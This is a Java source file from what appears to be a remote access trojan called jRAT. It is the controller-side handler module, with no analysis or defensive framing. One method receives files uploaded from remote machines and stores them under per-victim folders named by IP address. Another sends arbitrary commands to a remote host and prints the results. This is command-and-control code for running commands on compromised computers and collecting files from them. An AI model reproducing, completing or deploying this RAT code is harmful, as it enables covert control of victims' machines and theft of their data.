package jRAT.moduleHandlers;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.Socket;

import jRAT.server.JRATUtils;
import jRAT.server.JRATServer;

public class HandlerDefault {

    /* ----------------------------------------------------------------------------------------------------------------------- */

    public static void startDataThreadHandler(Socket socket, DataInputStream input, DataOutputStream output, String helloMessage)
    {
        try
        {
            while (true)
            {
                String responseCode = input.readUTF();

                if (responseCode.equals("CLOSE"))
                    break;
                else if (responseCode.equals("OK"))
                {
                    String filename     = input.readUTF();
                    long responseLength = input.readLong();
                    byte[] response     = new byte[(int)responseLength];
                    input.readFully(response);
                    JRATUtils.saveBytesToFile(JRATServer.getRemoteIP() + "/" + helloMessage + "/" + filename, response);    
                }
            }
        }
        catch (Exception ex) {}
        finally
        {
            try { input.close(); output.close(); socket.close(); }
            catch (Exception ex) {}
        }
    }
    
    /* ----------------------------------------------------------------------------------------------------------------------- */

    public static void processRunCommand(DataInputStream input, DataOutputStream output, String command)
    {
        try
        {
            output.writeUTF(command);
            String responseStatus = input.readUTF();
            if (responseStatus.equals("OK"))
            {
                long responseLength = input.readLong();
                byte[] response = new byte[(int)responseLength];

                input.readFully(response);
                System.out.println(new String(response, "UTF-8"));
            }
            else { System.out.println(responseStatus); }    
        }
        catch (Exception ex) { System.out.println("[ERROR]: Something went wrong!"); }  
    }

    /* ----------------------------------------------------------------------------------------------------------------------- */

}
